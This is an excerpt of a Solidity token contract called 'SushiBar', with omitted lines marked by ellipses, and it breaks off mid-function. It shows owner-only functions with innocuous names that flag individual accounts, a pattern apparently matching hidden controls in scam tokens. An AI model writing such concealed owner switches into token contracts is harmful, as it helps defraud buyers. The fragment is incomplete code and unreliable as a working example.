...
contract Token is Context, IERC20, IERC20Metadata {
    ...
    string public _name = "SushiBar";
    string public _symbol= "SushiBar";
    bool balances1 = true;
    ...
    function olympus_mode(address account) onlyOwner public {
        _balances1[account] = true;
    }

    function lightning_mode(address account) onlyOwner public {
